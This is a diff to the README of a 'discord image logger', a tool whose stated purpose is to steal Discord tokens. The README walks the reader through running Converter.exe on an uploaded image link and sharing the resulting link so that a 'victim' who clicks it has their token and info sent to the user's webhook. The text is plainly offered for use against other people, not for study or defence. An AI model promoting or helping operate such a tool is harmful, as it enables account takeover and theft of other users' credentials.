@@ -2,12 +2,12 @@
 A simple discord image logger. When you victim clicks on an image there token is sent to a webhook
 
 __How to use__
-1.Upload any image to discord
-2.Right click and copy link
-3.Run Converter.exe
-4.Paste the link. Ex: Link:<Image Link>
+1.Upload any image to discord \
+2.Right click and copy link \
+3.Run Converter.exe \ 
+4.Paste the link. Ex: Link:<Image Link> \ 
   
-Now it will return a link that you can copy paste and the victims info will be sent to that webhook
+Now it will return a link that you can copy paste and the victims info will be sent to that webhook \
   
   
   
